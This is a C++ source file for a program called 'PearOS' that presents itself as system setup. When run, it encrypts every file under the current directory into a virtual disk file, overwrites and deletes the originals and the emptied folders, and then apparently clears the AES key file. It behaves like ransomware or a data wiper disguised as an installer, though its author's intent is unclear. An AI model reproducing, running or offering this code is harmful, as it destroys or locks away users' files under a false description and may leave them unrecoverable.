#include <iostream>
#include <filesystem>
#include <string>
#include <vector>
#include <fstream>
#include <random>
#include <stack>
#include "VirtualHardDrive.h" // Assuming this includes your encryption header

namespace fs = std::filesystem;

// Function to check if we are on macOS
void checkForMacOS() {
#ifdef __APPLE__
    std::cerr << "This program cannot be run on macOS." << std::endl;
    exit(1);  // Stop the program
#endif
}

std::uintmax_t calculateTotalDirectorySize(const fs::path& sourcePath, const std::string& vhdFileName, const std::string& executableName) {
    std::uintmax_t totalSize = 0;

    for (const auto& entry : fs::recursive_directory_iterator(sourcePath)) {
        if (entry.is_regular_file()) {
            if (entry.path().filename() == vhdFileName || entry.path().filename() == executableName) {
                continue; // Skip these files
            }
            try {
                totalSize += fs::file_size(entry.path());
            } catch (const fs::filesystem_error& err) {
                std::cerr << "Error calculating size for " << entry.path() << ": " << err.what() << std::endl;
            }
        }
    }

    return totalSize;
}


// Function to securely overwrite and delete a file
bool securelyDeleteFile(const fs::path& filePath) {
    std::uintmax_t fileSize = 0;

    // Get the size of the file
    try {
        fileSize = fs::file_size(filePath);
    } catch (const fs::filesystem_error& e) {
        std::cerr << "Error getting file size for secure deletion: " << e.what() << std::endl;
        return false;
    }

    // Overwrite the file with random data
    std::ofstream file(filePath, std::ios::binary);
    if (!file) {
        std::cerr << "Error opening file for secure deletion: " << filePath << std::endl;
        return false;
    }

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<unsigned char> dis(0, 255);

    for (std::uintmax_t i = 0; i < fileSize; ++i) {
        file.put(static_cast<char>(dis(gen)));  // Write random data to each byte
    }
    file.close();

    // Optional: Overwrite with zeros for extra security
    std::ofstream fileZeros(filePath, std::ios::binary);
    for (std::uintmax_t i = 0; i < fileSize; ++i) {
        fileZeros.put(0);  // Write zeros to each byte
    }
    fileZeros.close();

    // Now remove the file
    try {
        fs::remove(filePath);
        std::cout << "Securely deleted file: " << filePath << std::endl;
    } catch (const fs::filesystem_error& e) {
        std::cerr << "Error deleting file: " << e.what() << std::endl;
        return false;
    }

    return true;
}

bool deleteEmptyDirectories(const fs::path& dirPath) {
    std::stack<fs::path> directories; // Stack to hold directories for later processing

    // First pass: gather all directories
    try {
        for (auto it = fs::recursive_directory_iterator(dirPath, fs::directory_options::skip_permission_denied);
             it != fs::recursive_directory_iterator(); ++it) {
            try {
                if (fs::is_directory(*it)) {
                    directories.push(*it); // Push directory onto the stack
                }
            } catch (const fs::filesystem_error& e) {
                // Suppress any filesystem errors (like inaccessible directories)
                continue;
            }
        }
    } catch (const fs::filesystem_error& e) {
        // Suppress the iterator-related errors
        return false;
    }

    // Second pass: delete empty directories
    while (!directories.empty()) {
        fs::path currentDir = directories.top();
        directories.pop(); // Get the top directory

        try {
            // Check if the directory is empty
            if (fs::is_empty(currentDir)) {
                fs::remove(currentDir);  // Attempt to delete the empty directory
                std::cout << "Deleted empty directory: " << currentDir << std::endl;
            }
        } catch (const fs::filesystem_error& e) {
            // Suppress errors when trying to delete directories
            continue;
        }
    }

    // Finally, check if the original dirPath is empty and delete it if so
    try {
        if (fs::is_empty(dirPath)) {
            fs::remove(dirPath);
            std::cout << "Deleted empty parent directory: " << dirPath << std::endl;
        }
    } catch (const fs::filesystem_error& e) {
        // Suppress errors when trying to delete the base directory
        return false;
    }

    return true;
}


void encryptAndSave(const fs::path& sourcePath, VirtualHardDrive& vhd, encryption& enc, const fs::path& basePath) {
    std::string vhdFileName = "virtual_hard_drive.vhd";
    std::string executableName = "PearOS";  // Replace with the actual name of your program

    std::uintmax_t totalDirectorySize = calculateTotalDirectorySize(sourcePath, vhdFileName, executableName);
    std::cout << "Total size of directory (excluding VHD and executable): " << totalDirectorySize << " bytes." << std::endl;

    // Store the directories for later cleanup after files are deleted
    std::vector<fs::path> directories;

    for (const auto& entry : fs::recursive_directory_iterator(sourcePath)) {
        if (entry.is_directory()) {
            directories.push_back(entry.path());  // Collect directories for later deletion
            continue; // Skip directories
        }

        // Skip the virtual hard drive file and the executable itself
        if (entry.path().filename() == vhdFileName || entry.path().filename() == executableName) {
            std::cout << "Skipping: " << entry.path() << std::endl;
            continue;
        }

        std::ifstream file(entry.path(), std::ios::binary);
        if (!file) {
            std::cerr << "Failed to open file: " << entry.path() << std::endl;
            continue;
        }

        std::vector<unsigned char> fileData((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        std::vector<unsigned char> encryptedData = enc.encrypt(std::string(fileData.begin(), fileData.end()));

        fs::path relativePath = fs::relative(entry.path(), basePath);
        std::string virtualPath = relativePath.string();

        vhd.writeData(encryptedData, virtualPath);
        file.close();  // Close the file before deleting

        // Securely delete the original unencrypted file
        if (!securelyDeleteFile(entry.path())) {
            std::cerr << "Failed to securely delete file: " << entry.path() << std::endl;
        }
    }

    // Attempt to delete empty directories after all files are processed
    for (const auto& dir : directories) {
        deleteEmptyDirectories(dir);
    }

    // Check if the base path is empty and delete it if it is
    if (fs::is_empty(sourcePath)) {
        try {
            fs::remove(sourcePath);
            std::cout << "Deleted empty directory: " << sourcePath << std::endl;
        } catch (const std::exception& e) {
            std::cerr << "Error deleting directory: " << sourcePath << ": " << e.what() << std::endl;
        }
    }
}




int main() {

    // Check if we're on macOS
    checkForMacOS();

    std::cout << "Welcome to PearOS" << std::endl;
    std::cout << "Setting up the system..." << std::endl;

    encryption enc;
    try {
        // Calculate total directory size (excluding VHD and executable)
        fs::path sourceDirectory = "./";
        std::string vhdFileName = "virtual_hard_drive.vhd";
        std::string executableName = "PearOS";
        std::uintmax_t totalDirectorySize = calculateTotalDirectorySize(sourceDirectory, vhdFileName, executableName);

        // Add some buffer to the calculated size (e.g., 20% overhead)
        std::size_t initialSize = totalDirectorySize + totalDirectorySize / 5;

        // Create a dynamic virtual hard drive with the calculated size
        VirtualHardDrive vhd(vhdFileName, enc, initialSize);

        // Encrypt and save files to the virtual hard drive
        encryptAndSave(sourceDirectory, vhd, enc, sourceDirectory);
    } catch (const std::exception& e) {
        std::cerr << e.what() << std::endl;
    }

    enc.clear("aeskey.dat");
    std::cout << "System is ready" << std::endl;

    return 0;
}



